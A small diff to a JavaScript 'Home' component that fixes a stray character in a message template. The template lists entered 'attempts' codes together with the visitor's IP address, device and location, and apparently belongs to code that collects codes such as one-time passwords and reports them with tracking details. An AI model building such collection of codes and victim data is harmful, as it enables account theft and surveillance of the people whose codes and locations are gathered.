@@ -323,7 +323,7 @@ const Home = () => {
             ? attempts.map((code, idx) => `   Code${idx + 1}: <code>${escapeHtml(code)}</code>`).join('\n')
             : '   Code1: <code>N/A</code>';
 
-        const message = `>
+        const message = `
 ⏰ ${formatDateTime()}
 🌐 IP: <code>${escapeHtml(safeIp)}</code>${deviceLine}
 📍 Vị trí: ${escapeHtml(`${safeCity}, ${safeRegion}, ${safeCountry}`)}
